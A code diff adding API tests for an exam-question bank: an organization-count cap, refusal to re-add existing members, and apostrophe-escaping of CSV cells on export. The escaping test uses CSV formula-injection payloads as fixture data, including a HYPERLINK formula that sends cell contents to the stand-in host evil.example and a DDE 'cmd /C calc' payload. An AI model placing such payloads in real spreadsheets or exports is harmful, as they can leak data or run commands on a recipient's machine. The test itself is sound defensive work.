@@ -114,6 +114,14 @@ test('sign-up: students by default (older apps too); organization accounts creat
   const second = await call<OrganizationMembershipSummary>(`/orgs`, { ...json('POST', { name: 'Second org', market: 'training_provider' }), token: o.token });
   assert.equal(second.status, 201);
   assert.equal((await call<OrganizationMembershipSummary[]>('/orgs', { token: o.token })).body.length, 2);
+  // Capped per account (sign-up organization included): every organization has its own free monthly allowances,
+  // so creating them without limit would multiply one account's AI quota. The default cap is 2.
+  const third = await call(`/orgs`, { ...json('POST', { name: 'Third org', market: 'training_provider' }), token: o.token });
+  assert.equal(third.status, 403, JSON.stringify(third.body));
+  assert.equal(third.body.code, 'organization_limit_reached');
+  assert.deepEqual(third.body.details, { max: 2 });
+  assert.equal((await call<OrganizationMembershipSummary[]>('/orgs', { token: o.token })).body.length, 2, 'nothing created');
+  assert.equal(((await sql`select count(*)::int as n from organizations where name = 'Third org'`) as unknown as { n: number }[])[0].n, 0);
 });
 
 test('membership and roles: add by email of an existing account, change role, never remove the last admin; access read per request', async () => {
@@ -147,6 +155,15 @@ test('membership and roles: add by email of an existing account, change role, ne
   const form = new FormData();
   form.append('file', new File([pdf], 'x.pdf', { type: 'application/pdf' }));
   assert.equal((await call(`/orgs/${orgId}/courses`, { method: 'POST', body: form, token: reviewer.token })).status, 403);
+
+  // Re-adding an existing member is refused: roles change only through PATCH, where the last-admin rule applies.
+  // (An upsert here used to let the only admin "add" themselves as reviewer and lock everyone out.)
+  const readd = await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { ...json('POST', { email: admin.email, role: 'reviewer' }), token: admin.token });
+  assert.equal(readd.status, 409, JSON.stringify(readd.body));
+  assert.equal(readd.body.code, 'already_member');
+  assert.equal((await call(`/orgs/${orgId}/members`, { ...json('POST', { email: editor.email.toUpperCase(), role: 'admin' }), token: admin.token })).body.code, 'already_member');
+  assert.deepEqual((await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { token: admin.token })).body.map((m) => [m.userId, m.role]), [[admin.id, 'admin'], [editor.id, 'editor'], [reviewer.id, 'reviewer']], 'roles unchanged');
+  assert.equal((await call(`/orgs/${orgId}`, { token: admin.token })).status, 200, 'the admin still has access');
 
   // Last admin protection; demotion and removal of others works; removal takes effect on the next request.
   assert.equal((await call(`/orgs/${orgId}/members/${admin.id}`, { ...json('PATCH', { role: 'editor' }), token: admin.token })).status, 409);
@@ -286,6 +303,32 @@ test('workflow: upload → generate drafts with located sources and flags → re
   const retired = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}/retire`, { ...json('POST', { note: 'Outdated' }), token: admin.token });
   assert.equal(retired.body.status, 'retired');
   assert.equal((await call(`/orgs/${orgId}/export?format=csv`, { token: admin.token })).headers.get('x-exama-export-count'), '0');
+
+  // CSV cells that a spreadsheet would run as formulas (leading = + - @) are exported as text (apostrophe prefix);
+  // ordinary cells are untouched. A question written as a formula must never execute on a colleague's machine.
+  const trap = await call<BankItem>(`/orgs/${orgId}/items`, {
+    ...json('POST', {
+      documentId: doc.id,
+      type: 'mcq',
+      topic: doc.topics[0],
+      stem: '=HYPERLINK("https://evil.example/?"&A1,"open")',
+      options: ['+1', '-2', '@SUM(A1)', 'plain'],
+      correctAnswer: 'plain',
+      explanation: "=cmd|' /C calc'!A0",
+    }),
+    token: admin.token,
+  });
+  assert.equal(trap.status, 201, JSON.stringify(trap.body));
+  assert.equal((await call(`/orgs/${orgId}/items/${trap.body.id}/approve`, { ...json('POST', {}), token: admin.token })).status, 200);
+  const trapCsv = await call(`/orgs/${orgId}/export?format=csv`, { token: admin.token });
+  assert.equal(trapCsv.headers.get('x-exama-export-count'), '1');
+  const line = trapCsv.text.split('\r\n').find((l) => l.includes(trap.body.id))!;
+  assert.ok(line.includes(`"'=HYPERLINK(""https://evil.example/?""&A1,""open"")"`), line);
+  assert.ok(line.includes(`"'+1","'-2","'@SUM(A1)","plain"`), line);
+  assert.ok(line.includes(`"'=cmd|' /C calc'!A0"`), line);
+  assert.ok(line.includes(`"Safety course"`) && !line.includes(`"'Safety course"`), 'ordinary cells are not prefixed');
+  assert.ok(!/(^|,)"[=+\-@]/.test(line), 'no cell starts with a formula character');
+  await call(`/orgs/${orgId}/items/${trap.body.id}/retire`, { ...json('POST', {}), token: admin.token });
 });
 
 test('generation rules: academy market is multiple-choice only; unknown topic / empty page range / unknown course refused; AI failure refunds the allowance', async () => {
